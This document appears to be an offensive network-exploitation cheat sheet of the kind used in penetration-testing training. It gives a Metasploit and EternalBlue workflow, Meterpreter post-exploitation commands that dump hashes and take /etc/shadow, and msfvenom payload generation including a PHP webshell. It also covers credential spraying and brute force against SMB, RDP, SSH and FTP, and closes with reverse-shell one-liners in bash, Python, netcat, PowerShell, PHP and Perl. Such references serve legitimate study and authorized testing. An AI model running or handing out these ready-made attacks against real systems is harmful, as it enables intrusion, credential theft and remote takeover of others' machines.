# Network Exploitation Reference

## Metasploit Workflow

### Basic Workflow
```
msfconsole -q

# 1. Search for exploits
msf6> search type:exploit name:smb
msf6> search cve:2017-0144          # EternalBlue
msf6> search type:exploit platform:linux rank:excellent

# 2. Select and configure
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> info                           # read description and references
msf6> show options                   # see required settings

# 3. Set options
msf6> set RHOSTS 10.10.10.40
msf6> set RPORT 445
msf6> set LHOST 10.10.14.5
msf6> set LPORT 4444

# 4. Choose payload
msf6> show payloads                  # list compatible payloads
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 5. Validate (non-destructive)
msf6> check                          # test if target is vulnerable without exploiting

# 6. Exploit
msf6> exploit                        # or: run
msf6> exploit -j                     # run as background job
```

### Meterpreter Post-Exploitation
```
meterpreter> sysinfo                 # OS info
meterpreter> getuid                  # current user
meterpreter> getsystem               # attempt privesc
meterpreter> hashdump                # dump password hashes
meterpreter> shell                   # drop to OS shell
meterpreter> upload /path/linpeas.sh /tmp/
meterpreter> download /etc/shadow /tmp/
meterpreter> portfwd add -l 8080 -p 80 -r 10.10.10.50  # port forward
meterpreter> background              # background session
```

### Multi/Handler (Catch Reverse Shells)
```
msf6> use exploit/multi/handler
msf6> set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6> set LHOST 0.0.0.0
msf6> set LPORT 4444
msf6> exploit -j                     # listen in background
```

### MSFvenom Payload Generation
```bash
# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# PHP webshell
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

# Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw

# War file (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war

# Shellcode (for buffer overflow)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -b '\x00' -f python
```

---

## Service-Specific Exploits

### SMB (Port 445)
```bash
# Enumeration first
crackmapexec smb TARGET -u '' -p '' --shares    # null session
smbclient -L //TARGET -N                         # list shares
enum4linux -a TARGET                              # comprehensive enum

# EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p445 TARGET
# In Metasploit: exploit/windows/smb/ms17_010_eternalblue

# SMBGhost (CVE-2020-0796)
nmap --script smb-vuln-cve-2020-0796 -p445 TARGET

# PsExec (with creds)
crackmapexec smb TARGET -u admin -p 'Password1' --exec-method smbexec -x 'whoami'
impacket-psexec admin:Password1@TARGET
```

### RDP (Port 3389)
```bash
# BlueKeep check (CVE-2019-0708)
nmap --script rdp-vuln-ms12-020 -p3389 TARGET

# Credential spray
crowbar -b rdp -s TARGET/32 -U users.txt -C passwords.txt -n 1

# Connect with creds
xfreerdp /u:admin /p:Password1 /v:TARGET /cert-ignore
rdesktop TARGET -u admin -p Password1
```

### SSH (Port 22)
```bash
# Banner grab and version check
nmap -sV -p22 TARGET

# Brute force (authorized only)
hydra -L users.txt -P passwords.txt ssh://TARGET -t 4

# Key-based auth check
ssh -o PreferredAuthentications=publickey TARGET

# Agent forwarding abuse (if compromised host has agent)
ssh -A user@compromised    # then pivot from there
```

### FTP (Port 21)
```bash
# Anonymous login
ftp TARGET                  # try anonymous / anonymous
nmap --script ftp-anon -p21 TARGET

# vsftpd 2.3.4 backdoor
nmap --script ftp-vsftpd-backdoor -p21 TARGET
# In Metasploit: exploit/unix/ftp/vsftpd_234_backdoor

# ProFTPd exploits
searchsploit proftpd
```

---

## Manual Exploit Compilation & Usage

### Workflow
```bash
# 1. Find and mirror exploit from Exploit-DB
searchsploit apache 2.4.49
searchsploit -m 50383                # mirror to current directory

# 2. Read the source (ALWAYS do this first)
cat 50383.py | head -50              # understand what it does

# 3. Check dependencies
grep -E '^import|^require|^#include' 50383.*

# 4. Compile/prepare
gcc exploit.c -o exploit -lpthread -lssl -lcrypto  # C
pip install -r requirements.txt                      # Python
javac Exploit.java                                   # Java

# 5. Run
python3 50383.py http://TARGET
./exploit TARGET 80
```

### Reverse Shell One-Liners
```bash
# Bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

# Python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

# Netcat (traditional)
nc -e /bin/bash LHOST LPORT
# Netcat (no -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc LHOST LPORT >/tmp/f

# PowerShell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"

# PHP
php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(LPORT,inet_aton("LHOST")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

### Shell Stabilization
```bash
# On target (after getting shell)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 120
```
